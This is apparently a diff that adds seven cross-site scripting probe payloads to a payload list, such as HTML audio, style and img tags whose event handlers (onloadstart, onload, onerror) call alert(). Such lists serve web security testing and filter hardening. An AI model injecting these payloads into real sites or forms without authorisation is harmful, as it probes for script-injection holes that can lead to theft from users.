@@ -1,0 +1,7 @@
+<audio/src/onloadstart=alert``>
+<audio src onloadstart=alert``>
+<audio/src/onloadstart=alert(2)>
+<style/onload=alert()>
+<style onload=alert()>
+<img src=x onerror=alert(1)>
+<img/src=x/onerror=alert(1)>
